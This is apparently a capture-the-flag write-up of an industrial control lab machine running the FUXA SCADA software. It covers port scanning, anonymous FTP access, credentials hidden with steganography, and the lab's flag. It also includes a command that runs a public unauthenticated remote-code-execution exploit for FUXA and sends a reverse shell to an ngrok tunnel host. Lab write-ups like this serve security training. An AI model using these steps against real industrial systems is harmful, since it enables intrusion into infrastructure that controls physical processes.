---
share_link: https://share.note.sx/lbac04dd#v3qI4xPa8krxyAYdYm3hyUTAS5f49Rgj1lUwkf2p/bw
share_updated: 2025-05-06T18:56:26+05:30
---




![[Pasted image 20250503090724.png]]


```
nmap -p 1-65535 192.168.171.225
```

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-16 19:37 IST  
Nmap scan report for 192.168.171.225  
Host is up (0.011s latency).  
Not shown: 65529 closed tcp ports (reset)  
PORT     STATE SERVICE  
21/tcp   open  ftp  
22/tcp   open  ssh  
1881/tcp open  ibm-mqseries2  
4840/tcp open  opcua-tcp  
5000/tcp open  upnp  
6060/tcp open  x11  
MAC Address: 2C:CF:67:00:23:5C (Raspberry Pi (Trading))  
  
Nmap done: 1 IP address (1 host up) scanned in 7.60 seconds
```


# ftp

```
ftp 192.168.171.225
```

```
Connected to 192.168.171.225.  
220 (vsFTPd 3.0.3)  
Name (192.168.171.225:pradyun): anonymous  
230 Login successful.  
Remote system type is UNIX.  
Using binary mode to transfer files.  
ftp> ls  
229 Entering Extended Passive Mode (|||30000|)  
150 Here comes the directory listing.  
drwxrwxr-x    2 ftp      ftp          4096 May 02 11:01 public  
drwxrwxr-x    2 ftp      ftp          4096 May 02 11:03 secret  
226 Directory send OK.
```

- readme.md
```
# Credentials for Valve Control HMI    
ops:ops
```

- vessel.jpg
```
└─$ steghide extract -sf vessel.jpg    
Enter passphrase:    
wrote extracted data to "admin.txt".
```

- admin.txt
```
└─$ cat admin.txt                            
ff@Ca!zqNg3ep3F
```

- admin creds works for fuxa but not hmi
- now suspecting fuxa has cve 

checking for any cves for this i have found https://github.com/rodolfomarianocy/Unauthenticated-RCE-FUXA-CVE-2023-33831/blob/main/CVE-2023-33831.py

- just ran this and got shell access
```
python cve.py --rhost 192.168.171.225 --rport 1881 --lhost 0.tcp.in.ngrok.io --lport 11494
```

- from the source challenge.py we got flag as it is hardcoded `FLAG = "FLAG{5y573m_15_c0mpr0m153d}"` . admins said to retrive flag thought ui lets analyse the source 
  
  - flag is logged and displayed when `activate_emergency` function is called .

```python
    async def activate_emergency(self):
        self.emergency_status = True
        self.emergency_hold_start = datetime.datetime.now()
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.emergency_log = f"""
        emergency system activated
        Time: {timestamp}
        Pressure: {self.pressure:.2f} bar (CRITICAL RANGE: 65–70 bar)
        Temperature: {self.temperature:.2f} °C (CRITICAL RANGE: 350—400 °C)
        Action: Automatic pressure release initiated
        Security Token: {FLAG}
        """
        logger.warning("EMERGENCY TRIGGERED!")
        logger.info(f"FLAG: {FLAG}")
        await self.update_variables()
```

- lets see where to call this fuunction , 

```python
    async def check_critical_conditions(self):
        if not self.emergency_status:
            if self.pressure > 67.0 or self.temperature > 360.0:
                await self.trigger_system_failure()

            if 65.0 <= self.pressure <= 67.0 and 350.0 <= self.temperature <= 360.0:
                if self.critical_condition_start is None:
                    self.critical_condition_start = datetime.datetime.now()
                elif (datetime.datetime.now() - self.critical_condition_start).total_seconds() >= self.critical_duration:
                    await self.activate_emergency()
            else:
                self.critical_condition_start = None
```

- when pressure is between 65.0 to 67.o and temperature is between 350.0 to 360 `activate_emergency` , lets try 
  
  ![[Pasted image 20250516210318.png]]
- got flag in ui


  # HMI

   
  

- got secrets

![[Pasted image 20250503092134.png]]
- login with ops : ops


![[Pasted image 20250503093737.png]]




# Getting shell as root

![[Pasted image 20250503102924.png]]
- this is an fuxa running , 
  
  >**FUXA** is an open-source **SCADA (Supervisory Control and Data Acquisition)** system. It is used for **monitoring and controlling industrial processes**
  
  checking for any cves for this i have found https://github.com/rodolfomarianocy/Unauthenticated-RCE-FUXA-CVE-2023-33831/blob/main/CVE-2023-33831.py

- just ran this and got shell access

![[Pasted image 20250503103203.png]]

![[Pasted image 20250503103229.png]]

![[Pasted image 20250503103252.png]]

